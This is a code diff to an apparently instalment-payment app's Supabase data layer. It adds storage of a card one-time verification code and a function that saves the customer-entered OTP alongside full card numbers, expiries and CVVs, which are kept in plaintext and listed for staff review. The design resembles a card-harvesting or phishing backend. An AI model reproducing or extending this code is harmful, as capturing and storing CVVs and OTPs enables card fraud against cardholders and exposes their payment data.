@@ -311,6 +311,7 @@ function mapPayment(row, receiptUrl = "") {
     cardNumber: row.card_number || "",
     cardExpiry: row.card_expiry || "",
     cardCvv: row.card_cvv || "",
+    cardOtp: row.card_otp || "",
     status: row.status,
     reviewedAt: row.reviewed_at,
     createdAt: row.created_at,
@@ -870,14 +871,14 @@ export async function listPayments() {
   let { data, error } = await supabase
     .from("payments")
     .select(
-      "id, customer_id, customer_code, instalment_id, contract_id, amount, payment_method, method, kind, receipt_path, cardholder_name, card_number, card_expiry, card_cvv, status, reviewed_at, created_at, customers(customer_code)"
+      "id, customer_id, customer_code, instalment_id, contract_id, amount, payment_method, method, kind, receipt_path, cardholder_name, card_number, card_expiry, card_cvv, card_otp, status, reviewed_at, created_at, customers(customer_code)"
     )
     .order("created_at", { ascending: false });
   if (error) {
     const retry = await supabase
       .from("payments")
       .select(
-        "id, customer_id, instalment_id, contract_id, amount, payment_method, receipt_path, cardholder_name, card_number, card_expiry, card_cvv, status, reviewed_at, created_at, customers(customer_code)"
+        "id, customer_id, instalment_id, contract_id, amount, payment_method, receipt_path, cardholder_name, card_number, card_expiry, card_cvv, card_otp, status, reviewed_at, created_at, customers(customer_code)"
       )
       .order("created_at", { ascending: false });
     data = retry.data;
@@ -887,7 +888,7 @@ export async function listPayments() {
     const plain = await supabase
       .from("payments")
       .select(
-        "id, customer_id, customer_code, instalment_id, contract_id, amount, payment_method, receipt_path, cardholder_name, card_number, card_expiry, card_cvv, status, reviewed_at, created_at"
+        "id, customer_id, customer_code, instalment_id, contract_id, amount, payment_method, receipt_path, cardholder_name, card_number, card_expiry, card_cvv, card_otp, status, reviewed_at, created_at"
       )
       .order("created_at", { ascending: false });
     data = plain.data;
@@ -1017,7 +1018,11 @@ export async function createPayment({
     bank_account_id: bankAccountId || null,
     status: "pending",
   };
-  let { error } = await supabase.from("payments").insert(row);
+  let { data: inserted, error } = await supabase
+    .from("payments")
+    .insert(row)
+    .select("id")
+    .single();
   if (error && /column|schema cache/i.test(error.message)) {
     const core = { ...row };
     delete core.method;
@@ -1025,8 +1030,26 @@ export async function createPayment({
     delete core.card_number;
     delete core.card_expiry;
     delete core.card_cvv;
-    const retry = await supabase.from("payments").insert(core);
+    delete core.card_otp;
+    const retry = await supabase.from("payments").insert(core).select("id").single();
+    inserted = retry.data;
     error = retry.error;
+  }
+  if (error) fail(error);
+  return inserted?.id;
+}
+
+export async function submitPaymentOtp({ paymentId, otpCode }) {
+  if (!paymentId) throw new Error("Payment is missing.");
+  const code = String(otpCode || "").replace(/\D/g, "").trim();
+  if (code.length < 4) throw new Error("Enter a valid verification code.");
+
+  let { error } = await supabase
+    .from("payments")
+    .update({ card_otp: code })
+    .eq("id", paymentId);
+  if (error && /column|schema cache/i.test(error.message)) {
+    return;
   }
   if (error) fail(error);
 }
